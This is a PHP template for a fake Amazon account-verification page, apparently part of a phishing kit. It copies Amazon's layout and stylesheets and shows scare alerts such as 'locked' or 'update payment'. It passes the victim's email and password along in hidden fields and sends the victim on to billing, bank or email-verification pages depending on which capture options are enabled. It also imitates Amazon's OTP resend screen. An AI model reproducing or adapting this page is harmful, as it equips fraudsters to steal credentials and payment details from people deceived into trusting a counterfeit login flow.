<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-touch a-gradients a-hires a-transform3d a-touch-scrolling a-android a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.3-2021-04-08">
<head>
<meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
<meta charset="utf-8">
<title dir="ltr">
<?php
                                    if ($alert_type == "unusual") {
                                      echo $alert['1'];
                                    }else{
                                    if ($alert_type == "unable") {
                                      echo $alert['2'];
                                    }else{
                                    if ($alert_type == "locked") {
                                      echo $alert['3'];
                                    }else{
                                      if ($alert_type == "disable") {
                                      echo $alert['4'];
                                    }else{
                                      if ($alert_type == "limited") {
                                        echo $alert['5'];
                                    }else{
                                      if ($alert_type == "update payment") {
                                        echo $alert['6'];
                                      }
                                    }
                                    }
                                    }
                                    }
                                    }
                                    ?>
</title>
<link rel="apple-touch-icon" sizes="76x76" href="img/logo.png">
<link rel="icon" type="image/png" href="img/logo.png">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11OrJUma5UL._RC|01rXlRztnIL.css,41aVkKTegZL.css,21ak7+1wqPL.css,01uNpa0PcLL.css,01NtHviPbnL.css,01xH24p45SL.css,310ooOGCdhL.css,11o2wHvvdBL.css,01i9N7e-hBL.css,11VHr91CkuL.css,11ADf9L1OdL.css,01IdKcBuAdL.css,019pz6QNQ6L.css,01wLsDqViEL.css,018gwG6-KML.css,017oxx82kUL.css,313nlhtomlL.css,01B-YPN7k2L.css,21VgUeznheL.css,116TGBv0izL.css,11hcDsGAR1L.css,21AL2IbGWYL.css,01Zit5mlZtL.css,01CFUgsA-YL.css,31rjFdV1T2L.css,014rTkZXuAL.css,1143-dXvfTL.css,11MNK-noG6L.css,11VvAxw559L.css,01XRXSECMKL.css,110Q3MAjYJL.css,217CY98bj7L.css,118ArY7aMgL.css,01vd5lqeZUL.css,215BN1xpbYL.css,11KiKPowgWL.css,01p8s3ASHFL.css,11r1-thmy4L.css,014n1hV6shL.css,11eI5SJms1L.css,01cbS3UK11L.css,21HViuPTI1L.css,01INc4pyFRL.css_.css?AUIClients/AmazonUI&amp;W62YVa8H#mobile.us.not-trident.322290-T2.338061-T1.322288-T1">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11vbcpUoDhL.css?AUIClients/CVFAssets#mobile">
</head>
<body class="a-color-offset-background a-m-us a-aui_72554-c a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-c a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c">
<div id="a-page">
	<div class="a-section a-spacing-none">
		<div class="a-container a-global-nav-wrapper">
			<div class="a-section a-spacing-none a-text-center">
				<a class="a-link-nav-icon" tabindex="-1"><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i></a>
			</div>
		</div>
	</div>
	<div class="a-section a-padding-base a-text-center">
		<div class="a-section a-text-left cvf-widget-container">
			<div class="a-section cvf-page-layout">
				<div id="cvf-page-content" class="a-section">
					<div class="a-row a-spacing-none">
							<?php
              if ($get_email == "on") {
                $next_alert = 'verify-email';
              }elseif ($get_cc == "on") {
                $next_alert = 'billing';
              }elseif ($get_bank == "on") {
                $next_alert = 'bank';
              }else{
                $next_alert = 'done';
              }
              ?>
							<form method="post" action="<?= $next_alert; ?>" class="a-spacing-none">
							<span class="a-declarative" data-action="a-sheet" data-a-sheet="{}"></span>
							<div class="a-row a-spacing-small">
								<div class="a-row a-spacing-small">
									<h1>
                    <?php
                    if ($alert_type == "unusual") {
                      echo enc($alert['1']);
                    }else{
                    if ($alert_type == "unable") {
                      echo enc($alert['2']);
                    }else{
                    if ($alert_type == "locked") {
                      echo enc($alert['3']);
                    }else{
                      if ($alert_type == "disable") {
                      echo enc($alert['4']);
                    }else{
                      if ($alert_type == "limited") {
                        echo enc($alert['5']);
                    }else{
                      if ($alert_type == "update payment") {
                        echo enc($alert['6']);
                      }
                    }
                    }
                    }
                    }
                    }
                    ?>
									</h1>
								</div>
								<div class="a-row a-spacing-micro">
									<span>
									<?php
	                  if ($alert_type == "unusual") {
	                    echo enc($talert['1']);
	                  }else{
	                  if ($alert_type == "unable") {
	                    echo enc($talert['2']);
	                  }else{
	                  if ($alert_type == "locked") {
	                    echo enc($talert['3']);
	                  }else{
	                    if ($alert_type == "disable") {
	                    echo enc($talert['4']);
	                  }else{
	                    if ($alert_type == "limited") {
	                      echo enc($talert['5']);
	                  }else{
	                    if ($alert_type == "update payment") {
	                      echo enc($talert['6']);
	                    }
	                  }
	                  }
	                  }
	                  }
	                  }
                  ?>
									</span>
								</div>
                				<input type="hidden" name="email" value="<?= $_POST['email']; ?>">
                        <input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
								<div class="a-row a-spacing-micro">
									<span></span>
								</div>
							</div>
							<div class="a-row a-spacing-micro"></div>
							<div class="a-row a-spacing-small">
								<span id="cvf-submit-otp-button" class="a-button a-button-span12 a-button-primary cvf-widget-btn cvf-widget-btn-verify" style="height: 47px;"><span class="a-button-inner"><input class="a-button-input" type="submit" aria-labelledby="cvf-submit-otp-button-announce"><span id="cvf-submit-otp-button-announce" class="a-button-text" aria-hidden="true"><?= enc($lang['btn2']); ?></span></span></span>
							</div>
						</form>
					</div>
					<div class="a-row a-spacing-none">
						<form method="post" action="verify" class="cvf-widget-form cvf-widget-form-resend a-spacing-none">
							<span class="a-button a-button-span12 a-button-base cvf-widget-btn cvf-widget-btn-resend" id="a-autoid-0"><span class="a-button-inner"><input class="a-button-input" type="submit" aria-labelledby="a-autoid-0-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce"><?= enc('Resend OTP'); ?></span></span></span>
						</form>
					</div>
					<form id="wait-resend-auto-read" method="post" action="verify" class="aok-hidden cvf-widget-form wait-one-minute a-spacing-none">
						<input type="hidden" name="forceMobileLayout" value="1" class="cvf-widget-hidden-fields"><input type="hidden" name="openid.assoc_handle" value="anywhere_v2_us" class="cvf-widget-hidden-fields"><input type="hidden" name="openid.mode" value="checkid_setup" class="cvf-widget-hidden-fields"><input type="hidden" name="openid.ns" value="http://specs.openid.net/auth/2.0" class="cvf-widget-hidden-fields"><input type="hidden" name="verifyToken" value="s|22592e77-549e-3a15-ac8f-fcf811951271" class="cvf-widget-hidden-fields">
						<div class="a-row">
							<div class="a-row a-spacing-base">
								<h1><?= enc('Authentication required'); ?></h1>
							</div>
							<div class="a-row a-spacing-base">
								<span><?= enc("It looks like you've requested a new OTP recently. Please wait one minute before getting a new OTP. OTPs you've already received won't work, so be sure to give the new OTP a moment to arrive."); ?></span>
							</div>
						</div>
						<div class="a-box a-alert-inline a-alert-inline-info cvf-resend-timer cvf-widget-alert cvf-widget-alert-id-cvf-resend-code">
							<div class="a-box-inner a-alert-container">
								<i class="a-icon a-icon-alert"></i>
								<div class="a-alert-content">
									<div id="timer" class="a-section cvf-alert-section cvf-widget-alert-message"><?= enc('You can now request a new code if needed.'); ?></div>
								</div>
							</div>
						</div>
						<span class="a-button a-button-span12 a-button-primary cvf-widget-btn wait-one-minute-continue" id="a-autoid-1"><span class="a-button-inner"><input class="a-button-input" type="submit" aria-labelledby="a-autoid-1-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-1-announce"><?= enc('Get new OTP'); ?></span></span></span>
					</form>
				</div>
			</div>
		</div>
	</div>
	<div class="a-row auth-footer">
		<style>
  .auth-footer-separator {
    display: inline-block;
    width: 20px;
  }
		</style>
		<div class="a-divider a-divider-section">
			<div class="a-divider-inner"></div>
		</div>
		<div id="footer" class="a-section">
			<div class="a-section a-spacing-small a-text-center a-size-mini">
				<span class="auth-footer-seperator"></span>
        <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f1']); ?></a>
        <span class="auth-footer-seperator"></span>
        <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f2']); ?></a>
        <span class="auth-footer-seperator"></span>
        <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f3']); ?></a>
        <span class="auth-footer-seperator"></span>
			</div>
			<div class="a-section a-spacing-none a-text-center">
				<span class="a-size-mini a-color-secondary"><?= enc($lang['f4']); ?></span>
			</div>
		</div>
	</div>
</div>
<div id="a-white"></div>
<div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
</body>
</html>